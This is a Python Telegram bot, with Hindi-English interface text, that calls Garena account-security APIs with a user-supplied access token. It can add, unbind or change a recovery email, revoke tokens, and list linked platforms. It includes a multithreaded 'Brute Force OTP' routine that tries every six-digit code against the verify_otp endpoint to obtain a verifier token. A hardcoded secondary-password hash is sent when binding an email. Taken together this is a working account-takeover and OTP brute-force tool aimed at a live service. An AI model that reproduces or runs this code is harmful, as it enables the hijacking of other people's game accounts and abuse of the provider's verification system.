"""Garena Account Tool - Smart Telegram Bot with credential memory."""

import asyncio
import concurrent.futures
import logging
import os
import threading
import requests

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    PicklePersistence,
    filters,
)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)

# ─── Garena Config ────────────────────────────────────────────────────────────

GARENA_APP_ID = "100067"
GARENA_HEADERS = {
    "User-Agent": "GarenaMSDK/4.0.41(TECNO KJ5 ;Android 13;en;HK;app 1.123.1 2019120270;)",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
}

# Feature identifiers
FEAT_ADD     = "add"
FEAT_CHECK   = "check"
FEAT_PLAT    = "platform"
FEAT_CANCEL  = "cancel"
FEAT_REVOKE  = "revoke"
FEAT_UNBIND  = "unbind"
FEAT_CHANGE  = "change"
FEAT_BF      = "bf"

# ─── Conversation States ──────────────────────────────────────────────────────

(
    MAIN_MENU,
    # ── Credential flow: email + token ───────────────
    CREDS_CONFIRM,       # use saved vs new (shows when saved exists)
    CREDS_NEW_EMAIL,     # type new email
    CREDS_NEW_ACCESS,    # type new access token
    CREDS_SAVE_ASK,      # ask: save creds for next time?
    # ── Credential flow: token only ──────────────────
    CREDS_TOKEN_CONFIRM, # use saved token vs new
    CREDS_TOKEN_NEW,     # type new token
    CREDS_TOKEN_SAVE_ASK,# ask: save token for next time?
    # ── Add Email ────────────────────────────────────
    ADD_OTP,
    # ── Unbind Email ─────────────────────────────────
    UNBIND_METHOD,
    UNBIND_OTP,
    UNBIND_PASS,
    # ── Change Bind Email ─────────────────────────────
    CHANGE_NEW_EMAIL,    # enter the new email to bind to
    CHANGE_METHOD,       # OTP or secondary password for old email
    CHANGE_OLD_OTP,
    CHANGE_PASS,
    CHANGE_NEW_OTP,
) = range(18)

# ─── Garena API Helpers ───────────────────────────────────────────────────────

def _post(url: str, data: dict) -> dict:
    r = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=30)
    r.raise_for_status()
    return r.json()

def _get(url: str, params: dict) -> dict:
    r = requests.get(url, headers=GARENA_HEADERS, params=params, timeout=30)
    r.raise_for_status()
    return r.json()

def api_send_otp(email: str, access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:send_otp",
        {"email": email, "locale": "en_MA", "region": "IND",
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_otp(email: str, access: str, otp: str) -> dict:
    """New email verification — returns verifier_token."""
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
        {"email": email, "app_id": GARENA_APP_ID, "access_token": access, "otp": otp},
    )

def api_verify_identity_otp(email: str, access: str, otp: str) -> dict:
    """Old/linked email verification — returns identity_token."""
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "otp": otp, "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_verify_identity_password(email: str, access: str, password: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
        {"email": email, "secondary_password": password,
         "app_id": GARENA_APP_ID, "access_token": access},
    )

def api_cancel_request(access: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_create_bind_request(access: str, verifier_token: str, email: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
        {
            "app_id": GARENA_APP_ID, "access_token": access,
            "verifier_token": verifier_token,
            "secondary_password": "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
            "email": email,
        },
    )

def api_get_bind_info(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
        {"app_id": GARENA_APP_ID, "access_token": access},
    )

def api_get_platforms(access: str) -> dict:
    return _get(
        "https://100067.connect.garena.com/bind/app/platform/info/get",
        {"access_token": access},
    )

def api_create_unbind_request(access: str, identity_token: str) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
        {"app_id": GARENA_APP_ID, "access_token": access, "identity_token": identity_token},
    )

def api_create_rebind_request(
    access: str, identity_token: str, verifier_token: str, new_email: str
) -> dict:
    return _post(
        "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
        {
            "identity_token": identity_token, "email": new_email,
            "app_id": GARENA_APP_ID, "verifier_token": verifier_token,
            "access_token": access,
        },
    )

def api_revoke_token(access: str) -> str:
    r = requests.get(
        f"https://100067.connect.garena.com/oauth/logout?access_token={access}",
        timeout=30,
    )
    return r.text.strip()

def convert_time(seconds: int) -> str:
    d, rem = divmod(int(seconds), 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    return f"{d}d {h}h {m}m {s}s"

# ─── Credential Store Helpers ─────────────────────────────────────────────────

def has_saved_creds(ud: dict) -> bool:
    return bool(ud.get("saved_email") and ud.get("saved_access"))

def has_saved_access(ud: dict) -> bool:
    return bool(ud.get("saved_access"))

def mask_token(token: str) -> str:
    if len(token) > 16:
        return f"{token[:10]}...{token[-4:]}"
    return token[:6] + "..."

def _save_creds(ud: dict, email: str, access: str) -> None:
    ud["saved_email"] = email
    ud["saved_access"] = access

def _save_access(ud: dict, access: str) -> None:
    ud["saved_access"] = access

def _load_saved(ud: dict) -> None:
    """Copy saved creds into working fields."""
    ud["email"]  = ud.get("saved_email", "")
    ud["access"] = ud.get("saved_access", "")

# ─── Keyboard Builders ────────────────────────────────────────────────────────

def main_menu_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📧 Add Recovery Email",    callback_data="add_email"),
         InlineKeyboardButton("🔍 Check Recovery Email",  callback_data="check_email")],
        [InlineKeyboardButton("🔗 Check Platform",        callback_data="check_platform"),
         InlineKeyboardButton("❌ Cancel Recovery Email", callback_data="cancel_email")],
        [InlineKeyboardButton("🔓 Unbind Email",          callback_data="unbind_email"),
         InlineKeyboardButton("🔄 Change Bind Email",     callback_data="change_bind")],
        [InlineKeyboardButton("🚫 Revoke Token",          callback_data="revoke_token"),
         InlineKeyboardButton("🔨 Brute Force OTP",       callback_data="brute_force")],
        [InlineKeyboardButton("🗑️ Saved Creds Clear Karo", callback_data="clear_creds")],
    ])

def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🏠 Main Menu", callback_data="back_main")]
    ])

def save_ask_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💾 Haan, save karo",  callback_data="save_yes"),
         InlineKeyboardButton("🚫 Nahi",             callback_data="save_no")],
        [InlineKeyboardButton("🏠 Main Menu",        callback_data="back_main")],
    ])

def use_saved_kb(email: str, token: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"✅ Use: {email} / {mask_token(token)}",
            callback_data="use_saved"
        )],
        [InlineKeyboardButton("🆕 Dusra account use karo", callback_data="use_new")],
        [InlineKeyboardButton("🏠 Main Menu",              callback_data="back_main")],
    ])

def use_saved_token_kb(token: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(
            f"✅ Use saved token: {mask_token(token)}",
            callback_data="use_saved_token"
        )],
        [InlineKeyboardButton("🆕 Dusra token use karo", callback_data="use_new_token")],
        [InlineKeyboardButton("🏠 Main Menu",            callback_data="back_main")],
    ])

def method_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📨 Email OTP se",          callback_data=f"{prefix}_otp")],
        [InlineKeyboardButton("🔐 Secondary Password se", callback_data=f"{prefix}_pass")],
        [InlineKeyboardButton("🏠 Main Menu",             callback_data="back_main")],
    ])

# ─── Shared Utility Functions ─────────────────────────────────────────────────

def _saved_info_line(ud: dict) -> str:
    """One-liner showing saved credentials if any."""
    if has_saved_creds(ud):
        return (
            f"📌 *Saved:* `{ud['saved_email']}` / "
            f"`{mask_token(ud['saved_access'])}`\n"
        )
    elif has_saved_access(ud):
        return f"📌 *Saved token:* `{mask_token(ud['saved_access'])}`\n"
    return ""


async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    # Keep saved creds intact — only clear working fields
    ud = context.user_data
    for key in ["email", "access", "new_email", "old_email",
                "_feature", "unbind_method", "change_method",
                "identity_token", "verifier_token"]:
        ud.pop(key, None)

    text = (
        "🎮 *Garena Account Tool*\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        + _saved_info_line(ud) +
        "👇 Feature choose karo aur click karo:"
    )
    kb = main_menu_keyboard()
    if update.message:
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    elif update.callback_query:
        await update.callback_query.answer()
        try:
            await update.callback_query.edit_message_text(
                text, parse_mode="Markdown", reply_markup=kb
            )
        except Exception:
            await update.callback_query.message.reply_text(
                text, parse_mode="Markdown", reply_markup=kb
            )
    return MAIN_MENU


async def cancel_op(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("❌ Cancel ho gaya.", reply_markup=back_kb())
    return ConversationHandler.END


async def _done(update: Update, text: str) -> None:
    await update.effective_message.reply_text(
        text, parse_mode="Markdown", reply_markup=back_kb()
    )


async def _err(update: Update, text: str) -> None:
    await update.effective_message.reply_text(
        f"❌ {text}", parse_mode="Markdown", reply_markup=back_kb()
    )

# ─── Feature Routing (called once credentials are ready) ─────────────────────

async def proceed_to_feature(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Called after credentials (email/access) are set in user_data.
    Executes the feature or jumps to its next state.
    """
    ud      = context.user_data
    feature = ud.get("_feature")
    email   = ud.get("email", "")
    access  = ud.get("access", "")
    msg     = update.effective_message

    # ── Token-only features: execute immediately ──────────────────────────────

    if feature == FEAT_CHECK:
        await msg.reply_text("⏳ Info fetch kar raha hoon...")
        try:
            data      = api_get_bind_info(access)
            ev        = data.get("email", "")
            ep        = data.get("email_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            if ev == "" and ep:
                result = f"📧 *Pending Email:* `{ep}`\n⏰ *Confirm Hoga:* {convert_time(countdown)}"
            elif ev and not ep:
                result = f"📧 *Linked Email:* `{ev}`\n✅ *Confirmed!*"
            else:
                result = "❌ Koi email linked nahi hai!"
            await _done(update, result)
        except Exception as e:
            await _err(update, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_PLAT:
        await msg.reply_text("⏳ Platform info fetch kar raha hoon...")
        try:
            j = api_get_platforms(access)
            pm = {3: "Facebook", 5: "VK", 7: "Huawei",
                  8: "Gmail", 10: "iCloud", 11: "Twitter"}
            bounded   = j.get("bounded_accounts", [])
            available = j.get("available_platforms", [])
            lines = ["🔗 *Secondary Links:*"]
            found = False
            for x in bounded:
                p = x.get("platform")
                ui = x.get("user_info", {})
                e = ui.get("email", "")
                n = ui.get("nickname", "")
                if p in pm:
                    lines.append(f"\n*{pm[p]}*")
                    if e: lines.append(f"  📧 `{e}`")
                    if n: lines.append(f"  👤 `{n}`")
                    found = True
            if not found:
                lines.append("  _Koi secondary link nahi mila_")
            for k, name in pm.items():
                if k not in available:
                    lines.append(f"\n🎮 *Main Platform:* {name}")
                    break
            await _done(update, "\n".join(lines))
        except Exception as e:
            await _err(update, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_CANCEL:
        await msg.reply_text("⏳ Cancel kar raha hoon...")
        try:
            res = api_cancel_request(access)
            if res.get("result") == 0:
                await _done(update, "✅ Recovery email request cancel ho gaya!")
            else:
                await _err(update, f"Cancel fail:\n`{res}`")
        except Exception as e:
            await _err(update, f"Error: `{e}`")
        return ConversationHandler.END

    if feature == FEAT_REVOKE:
        await msg.reply_text("⏳ Token revoke kar raha hoon...")
        try:
            resp = api_revoke_token(access)
            if resp == '{"result":0}':
                await _done(update, "✅ *Token successfully revoke ho gaya!* 🎉")
            else:
                await _err(update, f"Revoke fail:\n`{resp}`")
        except Exception as e:
            await _err(update, f"Error: `{e}`")
        return ConversationHandler.END

    # ── Email + Token features: multi-step ───────────────────────────────────

    if feature == FEAT_ADD:
        await msg.reply_text("⏳ OTP bhej raha hoon...")
        try:
            res = api_send_otp(email, access)
            if res.get("result") == 0:
                await msg.reply_text(
                    f"✅ OTP `{email}` pe bhej diya!\n\n📝 OTP enter karo:",
                    parse_mode="Markdown",
                )
                return ADD_OTP
            else:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END

    if feature == FEAT_UNBIND:
        await msg.reply_text(
            "🔓 *Unbind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "👇 Verify method choose karo:",
            parse_mode="Markdown",
            reply_markup=method_kb("unbind"),
        )
        return UNBIND_METHOD

    if feature == FEAT_CHANGE:
        await msg.reply_text("📝 Nayi (new) email address type karo jisme bind karna hai:")
        return CHANGE_NEW_EMAIL

    if feature == FEAT_BF:
        chat_id = update.effective_chat.id
        await msg.reply_text("⏳ OTP bhej raha hoon...")
        try:
            res = api_send_otp(email, access)
            if res.get("result") != 0:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END
        await msg.reply_text(
            "✅ OTP bhej diya!\n\n"
            "🔨 *Brute Force background mein shuru ho gaya!*\n"
            "Jab sahi code mile sirf tab ek message aayega.\n"
            "Baaki sab attempts automatic band. ⏳",
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
        context.application.create_task(
            run_brute_force(chat_id, email, access, context.application.bot)
        )
        return ConversationHandler.END

    return ConversationHandler.END

# ─── Credential Flow Handlers ─────────────────────────────────────────────────

async def _start_email_token_feature(
    update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str, title: str, icon: str
) -> int:
    """Show saved-creds prompt or go directly to email input."""
    ud = context.user_data
    ud["_feature"] = feature
    await update.callback_query.answer()

    if has_saved_creds(ud):
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 *Saved credentials mili hain:*\n"
            f"📧 `{ud['saved_email']}`\n"
            f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
            "Inhe use karein ya dusra account?",
            parse_mode="Markdown",
            reply_markup=use_saved_kb(ud["saved_email"], ud["saved_access"]),
        )
        return CREDS_CONFIRM
    else:
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Email address type karo:",
            parse_mode="Markdown",
        )
        return CREDS_NEW_EMAIL


async def _start_token_feature(
    update: Update, context: ContextTypes.DEFAULT_TYPE, feature: str, title: str, icon: str
) -> int:
    """Show saved-token prompt or go directly to token input."""
    ud = context.user_data
    ud["_feature"] = feature
    await update.callback_query.answer()

    if has_saved_access(ud):
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📌 *Saved token mila hai:*\n"
            f"🔑 `{mask_token(ud['saved_access'])}`\n\n"
            "Ise use karein ya naya token?",
            parse_mode="Markdown",
            reply_markup=use_saved_token_kb(ud["saved_access"]),
        )
        return CREDS_TOKEN_CONFIRM
    else:
        await update.callback_query.edit_message_text(
            f"{icon} *{title}*\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Access Token type karo:",
            parse_mode="Markdown",
        )
        return CREDS_TOKEN_NEW


# ── CREDS_CONFIRM handler (email + token) ─────────────────────────────────────

async def creds_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    ud   = context.user_data

    if data == "back_main":
        return await show_main_menu(update, context)

    if data == "use_saved":
        _load_saved(ud)
        await update.callback_query.edit_message_text(
            f"✅ *Saved credentials load ho gayi:*\n"
            f"📧 `{ud['email']}`\n"
            f"🔑 `{mask_token(ud['access'])}`\n\n"
            "⏳ Processing...",
            parse_mode="Markdown",
        )
        return await proceed_to_feature(update, context)

    if data == "use_new":
        await update.callback_query.edit_message_text(
            "🆕 *Naya Account*\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Email address type karo:",
            parse_mode="Markdown",
        )
        return CREDS_NEW_EMAIL

    return CREDS_CONFIRM


async def creds_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["email"] = update.message.text.strip()
    await update.message.reply_text("📝 Access Token type karo:")
    return CREDS_NEW_ACCESS


async def creds_new_access(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["access"] = update.message.text.strip()
    await update.message.reply_text(
        "💾 Ye credentials save karein agle baar ke liye?",
        reply_markup=save_ask_kb(),
    )
    return CREDS_SAVE_ASK


async def creds_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    ud   = context.user_data

    if data == "back_main":
        return await show_main_menu(update, context)

    if data == "save_yes":
        _save_creds(ud, ud["email"], ud["access"])
        await update.callback_query.edit_message_text(
            "✅ *Credentials save ho gayi!*\n⏳ Processing...", parse_mode="Markdown"
        )
    else:
        await update.callback_query.edit_message_text("⏳ Processing...")

    return await proceed_to_feature(update, context)


# ── CREDS_TOKEN_CONFIRM handler (token only) ──────────────────────────────────

async def creds_token_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    ud   = context.user_data

    if data == "back_main":
        return await show_main_menu(update, context)

    if data == "use_saved_token":
        ud["access"] = ud["saved_access"]
        await update.callback_query.edit_message_text(
            f"✅ *Saved token load ho gaya:*\n"
            f"🔑 `{mask_token(ud['access'])}`\n\n"
            "⏳ Processing...",
            parse_mode="Markdown",
        )
        return await proceed_to_feature(update, context)

    if data == "use_new_token":
        await update.callback_query.edit_message_text(
            "🆕 *Naya Token*\n━━━━━━━━━━━━━━━━━━━━━━\n"
            "📝 Access Token type karo:",
            parse_mode="Markdown",
        )
        return CREDS_TOKEN_NEW

    return CREDS_TOKEN_CONFIRM


async def creds_token_new(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["access"] = update.message.text.strip()
    await update.message.reply_text(
        "💾 Ye token save karein agle baar ke liye?",
        reply_markup=save_ask_kb(),
    )
    return CREDS_TOKEN_SAVE_ASK


async def creds_token_save_ask(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data
    ud   = context.user_data

    if data == "back_main":
        return await show_main_menu(update, context)

    if data == "save_yes":
        _save_access(ud, ud["access"])
        await update.callback_query.edit_message_text(
            "✅ *Token save ho gaya!*\n⏳ Processing...", parse_mode="Markdown"
        )
    else:
        await update.callback_query.edit_message_text("⏳ Processing...")

    return await proceed_to_feature(update, context)

# ─── Feature Button Handlers (entry points from main menu) ────────────────────

async def add_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_ADD, "Add Recovery Email", "📧")

async def check_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_CHECK, "Check Recovery Email", "🔍")

async def platform_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_PLAT, "Check Platform", "🔗")

async def cancel_email_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_CANCEL, "Cancel Recovery Email", "❌")

async def revoke_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_token_feature(u, c, FEAT_REVOKE, "Revoke Access Token", "🚫")

async def unbind_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_UNBIND, "Unbind Email", "🔓")

async def change_bind_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_CHANGE, "Change Bind Email", "🔄")

async def bf_start(u: Update, c: ContextTypes.DEFAULT_TYPE) -> int:
    return await _start_email_token_feature(u, c, FEAT_BF, "Brute Force OTP", "🔨")

async def clear_creds(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    context.user_data.pop("saved_email", None)
    context.user_data.pop("saved_access", None)
    return await show_main_menu(update, context)

# ─── Add Email Specific States ────────────────────────────────────────────────

async def add_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp    = update.message.text.strip()
    ud     = context.user_data
    email  = ud["email"]
    access = ud["access"]

    await update.message.reply_text("⏳ OTP verify kar raha hoon...")
    try:
        res = api_verify_otp(email, access, otp)
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            await _err(update, f"OTP verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Email bind kar raha hoon...")
        api_cancel_request(access)
        bind_res = api_create_bind_request(access, verifier_token, email)
        if bind_res.get("result") == 0:
            await _done(update, f"✅ *SUCCESS!*\n`{email}` successfully add ho gaya!")
        else:
            await _err(update, f"Bind fail:\n`{bind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Unbind Email Specific States ─────────────────────────────────────────────

async def unbind_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data = update.callback_query.data

    if data == "back_main":
        return await show_main_menu(update, context)

    context.user_data["unbind_method"] = data

    if data == "unbind_otp":
        email  = context.user_data["email"]
        access = context.user_data["access"]
        await update.callback_query.edit_message_text(
            f"⏳ OTP `{email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        try:
            res = api_send_otp(email, access)
            if res.get("result") == 0:
                await update.callback_query.message.reply_text(
                    "✅ OTP bhej diya!\n\n📝 OTP enter karo:"
                )
                return UNBIND_OTP
            else:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END
    else:
        await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
        return UNBIND_PASS


async def unbind_get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp    = update.message.text.strip()
    ud     = context.user_data
    email  = ud["email"]
    access = ud["access"]

    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(email, access, otp)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        unbind_res = api_create_unbind_request(access, identity_token)
        if unbind_res.get("result") == 0:
            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, f"Unbind fail:\n`{unbind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END


async def unbind_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password = update.message.text.strip()
    ud       = context.user_data
    email    = ud["email"]
    access   = ud["access"]

    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(email, access, password)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Unbind request create kar raha hoon...")
        unbind_res = api_create_unbind_request(access, identity_token)
        if unbind_res.get("result") == 0:
            await _done(update, "✅ *SUCCESS!* Email unbind request create ho gaya!")
        else:
            await _err(update, f"Unbind fail:\n`{unbind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Change Bind Email Specific States ───────────────────────────────────────

async def change_get_new_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["new_email"] = update.message.text.strip()
    await update.message.reply_text(
        "🔄 *Change Bind Email*\n━━━━━━━━━━━━━━━━━━━━━━\n"
        "Purani email verify karne ka method:",
        parse_mode="Markdown",
        reply_markup=method_kb("chg"),
    )
    return CHANGE_METHOD


async def change_method(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.callback_query.answer()
    data   = update.callback_query.data
    ud     = context.user_data
    old_email = ud["email"]
    access    = ud["access"]

    if data == "back_main":
        return await show_main_menu(update, context)

    if data == "chg_otp":
        await update.callback_query.edit_message_text(
            f"⏳ OTP `{old_email}` pe bhej raha hoon...", parse_mode="Markdown"
        )
        try:
            res = api_send_otp(old_email, access)
            if res.get("result") == 0:
                await update.callback_query.message.reply_text(
                    "✅ OTP bhej diya!\n\n📝 Purani email ka OTP enter karo:"
                )
                return CHANGE_OLD_OTP
            else:
                await _err(update, f"OTP send fail:\n`{res}`")
                return ConversationHandler.END
        except Exception as e:
            await _err(update, f"Error: `{e}`")
            return ConversationHandler.END
    else:
        await update.callback_query.edit_message_text("📝 Secondary Password type karo:")
        return CHANGE_PASS


async def _finish_rebind(update, context):
    """Send OTP to new email and transition to CHANGE_NEW_OTP."""
    ud        = context.user_data
    new_email = ud["new_email"]
    access    = ud["access"]

    await update.effective_message.reply_text(
        f"⏳ OTP `{new_email}` pe bhej raha hoon...", parse_mode="Markdown"
    )
    try:
        res = api_send_otp(new_email, access)
        if res.get("result") == 0:
            await update.effective_message.reply_text(
                "✅ OTP bhej diya!\n\n📝 Nayi email ka OTP enter karo:"
            )
            return CHANGE_NEW_OTP
        else:
            await _err(update, f"OTP send fail:\n`{res}`")
            return ConversationHandler.END
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_old_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp       = update.message.text.strip()
    ud        = context.user_data
    old_email = ud["email"]
    access    = ud["access"]

    await update.message.reply_text("⏳ Identity verify kar raha hoon...")
    try:
        res = api_verify_identity_otp(old_email, access, otp)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        ud["identity_token"] = identity_token
        return await _finish_rebind(update, context)
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_pass(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    password  = update.message.text.strip()
    ud        = context.user_data
    old_email = ud["email"]
    access    = ud["access"]

    await update.message.reply_text("⏳ Secondary password verify kar raha hoon...")
    try:
        res = api_verify_identity_password(old_email, access, password)
        identity_token = res.get("identity_token")
        if not identity_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        ud["identity_token"] = identity_token
        return await _finish_rebind(update, context)
    except Exception as e:
        await _err(update, f"Error: `{e}`")
        return ConversationHandler.END


async def change_get_new_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp       = update.message.text.strip()
    ud        = context.user_data
    new_email = ud["new_email"]
    access    = ud["access"]
    identity_token = ud["identity_token"]

    await update.message.reply_text("⏳ Nayi email verify kar raha hoon...")
    try:
        res = api_verify_otp(new_email, access, otp)
        verifier_token = res.get("verifier_token")
        if not verifier_token:
            await _err(update, f"Verify fail:\n`{res}`")
            return ConversationHandler.END
        await update.message.reply_text("⏳ Rebind request create kar raha hoon...")
        rebind_res = api_create_rebind_request(
            access, identity_token, verifier_token, new_email
        )
        if rebind_res.get("result") == 0:
            await _done(update, f"✅ *SUCCESS!* Email `{new_email}` pe change ho gaya!")
        else:
            await _err(update, f"Rebind fail:\n`{rebind_res}`")
    except Exception as e:
        await _err(update, f"Error: `{e}`")
    return ConversationHandler.END

# ─── Brute Force (Background) ─────────────────────────────────────────────────

async def run_brute_force(chat_id: int, email: str, access: str, bot) -> None:
    """
    20 parallel threads, 000000–999999.
    Sends EXACTLY ONE Telegram message when found. All threads stop immediately.
    """
    found_event   = threading.Event()
    result_holder: list[dict] = []

    def try_codes(start: int, end: int) -> None:
        url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        for code in range(start, end):
            if found_event.is_set():
                return
            code_str = f"{code:06d}"
            data = {"email": email, "app_id": GARENA_APP_ID,
                    "access_token": access, "otp": code_str}
            try:
                resp   = requests.post(url, headers=GARENA_HEADERS, data=data, timeout=15)
                result = resp.json()
                if result.get("result") == 0:
                    found_event.set()
                    result_holder.append({
                        "code": code_str,
                        "verifier_token": result.get("verifier_token", ""),
                    })
                    return
            except Exception:
                if found_event.is_set():
                    return
                continue

    NUM_THREADS = 20
    TOTAL       = 1_000_000
    chunk       = TOTAL // NUM_THREADS

    loop = asyncio.get_event_loop()

    def run_pool() -> None:
        with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_THREADS) as ex:
            futures = [
                ex.submit(try_codes, i * chunk,
                          (i + 1) * chunk if i < NUM_THREADS - 1 else TOTAL)
                for i in range(NUM_THREADS)
            ]
            concurrent.futures.wait(futures)

    await loop.run_in_executor(None, run_pool)

    if result_holder:
        r = result_holder[0]
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "🎯 *Brute Force — CODE MIL GAYA!*\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔑 OTP Code: `{r['code']}`\n"
                f"🎫 Verifier Token: `{r['verifier_token']}`"
            ),
            parse_mode="Markdown",
            reply_markup=back_kb(),
        )
    else:
        await bot.send_message(
            chat_id=chat_id,
            text=(
                "❌ Brute force complete — sahi code nahi mila.\n"
                "(000000–999999 sab try ho gaye)"
            ),
            reply_markup=back_kb(),
        )

